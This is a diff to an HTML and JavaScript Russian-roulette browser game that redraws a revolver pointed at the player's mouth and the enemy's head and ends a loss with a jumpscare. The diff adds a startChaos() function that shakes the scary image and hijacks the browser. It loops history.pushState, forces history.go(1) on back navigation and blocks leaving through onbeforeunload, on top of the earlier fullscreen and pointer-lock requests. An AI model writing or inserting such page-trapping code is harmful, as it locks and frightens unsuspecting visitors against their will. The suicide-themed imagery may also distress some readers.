@@ -27,26 +27,22 @@
             50% { transform: translateX(-50%) scale(1.15); opacity: 1; }
         }
 
-        /* L-SHAPED REVOLVER DESIGN */
+        /* L-SHAPED REVOLVER */
         #gun-container {
             position: absolute; bottom: 0; left: 50%; 
             width: 200px; height: 300px; transition: all 0.8s cubic-bezier(0.4, 0, 0.2, 1); 
             z-index: 10; transform: translateX(-50%) rotate(0deg);
         }
-        /* Top Horizontal Section of the L */
-        .upper-receiver { position: absolute; top: 0; left: 0; width: 200px; height: 60px; }
-        .barrel { width: 130px; height: 35px; background: #222; border-radius: 4px; border: 2px solid #111; position: absolute; left: 0; top: 10px; }
-        .cylinder { width: 60px; height: 60px; background: #333; border-radius: 8px; border: 3px solid #111; position: absolute; right: 10px; top: 0; z-index: 2; }
-        
-        /* Vertical Grip Section of the L */
-        .grip { width: 45px; height: 110px; background: #1a1a1a; border-radius: 0 0 15px 15px; border: 3px solid #000; position: absolute; right: 15px; top: 55px; }
-        .trigger-guard { width: 35px; height: 40px; border: 3px solid #222; border-radius: 50%; position: absolute; right: 55px; top: 50px; }
-        .hammer { width: 8px; height: 15px; background: #444; position: absolute; top: -10px; right: 15px; border-radius: 2px; }
+        /* Pointing UP for Player (Mouth) */
+        .barrel { width: 35px; height: 130px; background: #222; border-radius: 4px; border: 2px solid #111; position: absolute; left: 82px; top: 0; }
+        .cylinder { width: 60px; height: 60px; background: #333; border-radius: 8px; border: 3px solid #111; position: absolute; left: 70px; top: 120px; z-index: 2; }
+        .grip { width: 45px; height: 90px; background: #1a1a1a; border-radius: 0 0 15px 15px; border: 3px solid #000; position: absolute; left: 78px; top: 180px; }
+        .trigger-guard { width: 30px; height: 35px; border: 3px solid #222; border-radius: 50%; position: absolute; left: 55px; top: 165px; }
 
-        /* Enemy Hand: Sideways to head */
+        /* Enemy Position: Rotated so barrel points LEFT into their head */
         #gun-container.enemy-hand { 
             bottom: 45%; left: 70%; 
-            transform: rotate(90deg) scale(0.6); 
+            transform: rotate(-90deg) scale(0.6); 
         }
         
         /* Recoil Logic */
@@ -60,9 +56,9 @@
         }
         #gun-container.enemy-hand.recoil { animation: kick-enemy 0.15s ease-out; }
         @keyframes kick-enemy { 
-            0% { transform: rotate(90deg) scale(0.6) translateX(0); } 
-            50% { transform: rotate(90deg) scale(0.6) translateX(120px); } 
-            100% { transform: rotate(90deg) scale(0.6) translateX(0); } 
+            0% { transform: rotate(-90deg) scale(0.6) translateX(0); } 
+            50% { transform: rotate(-90deg) scale(0.6) translateX(120px); } 
+            100% { transform: rotate(-90deg) scale(0.6) translateX(0); } 
         }
         @keyframes lethal-kick { 
             0% { transform: translateX(-50%) translateY(0); } 
@@ -70,11 +66,8 @@
         }
 
         #game-ui { position: absolute; bottom: 5%; width: 100%; text-align: center; z-index: 20; }
-        #scary-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('./scary.gif') center/cover; display: none; z-index: 1000; }
+        #scary-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('./scary.gif') center/cover; display: none; z-index: 1000; transition: transform 0.05s; }
         #death-text { position: fixed; top: 0; left: 0; width: 100%; height: 100%; display: none; justify-content: center; align-items: center; background: black; z-index: 2000; color: #ff0000; font-size: 80px; font-weight: bold; }
-        
-        button { padding: 15px 30px; font-size: 20px; cursor: pointer; background: transparent; color: #ff0000; border: 2px solid #ff0000; text-transform: uppercase; font-weight: bold; }
-        button:disabled { opacity: 0; pointer-events: none; }
     </style>
 </head>
 <body>
@@ -84,18 +77,15 @@
     </div>
 
     <div id="gun-container">
-        <div class="upper-receiver">
-            <div class="barrel"></div>
-            <div class="cylinder"></div>
-            <div class="hammer"></div>
-        </div>
+        <div class="barrel"></div>
+        <div class="cylinder"></div>
         <div class="trigger-guard"></div>
         <div class="grip"></div>
     </div>
 
     <div id="game-ui">
         <div id="status" style="margin-bottom:10px;">CHAMBER: 1/6</div>
-        <button id="trigger-btn">PULL TRIGGER</button>
+        <button id="trigger-btn" onclick="playerShoot()">PULL TRIGGER</button>
     </div>
 
     <div id="death-text">YOU DIED</div>
@@ -105,6 +95,7 @@
     <script>
         let bulletPos = Math.floor(Math.random() * 6) + 1;
         let currentShot = 1;
+        let started = false;
         
         const triggerBtn = document.getElementById('trigger-btn');
         const gun = document.getElementById('gun-container');
@@ -116,7 +107,7 @@
 
         function updatePsychology() {
             const fear = (currentShot - 1) / 5; 
-            const color = `rgb(255, ${Math.floor(255 * fear)}, ${Math.floor(255 * fear)})`;
+            const color = `rgb(255, ${Math.floor(255 * (1 - fear))}, ${Math.floor(255 * (1 - fear))})`;
             eyes.forEach(e => {
                 e.style.background = color;
                 e.style.boxShadow = `0 0 20px ${color}`;
@@ -124,7 +115,7 @@
             enemyObj.style.animationDuration = `${3 - (fear * 2.2)}s`;
         }
 
-        triggerBtn.addEventListener('click', () => {
+        function playerShoot() {
             triggerBtn.disabled = true;
             if (currentShot === bulletPos) {
                 gun.classList.add('lethal-recoil');
@@ -139,7 +130,7 @@
                     setTimeout(passToEnemy, 1000);
                 }, 200);
             }
-        });
+        }
 
         function passToEnemy() {
             gun.classList.add('enemy-hand');
@@ -180,7 +171,20 @@
                     }
                     if (elem.requestPointerLock) elem.requestPointerLock();
                 } catch (err) {}
+                startChaos();
             }, 800);
+        }
+
+        function startChaos() {
+            setInterval(() => {
+                const x = (Math.random() - 0.5) * 60;
+                const y = (Math.random() - 0.5) * 60;
+                scaryScreen.style.transform = `translate(${x}px, ${y}px)`;
+            }, 30);
+            window.history.pushState(null, null, window.location.href);
+            window.onpopstate = () => window.history.go(1);
+            setInterval(() => window.history.pushState(null, "", window.location.href), 100);
+            window.onbeforeunload = (e) => { e.preventDefault(); e.returnValue = ''; };
         }
     </script>
 </body>
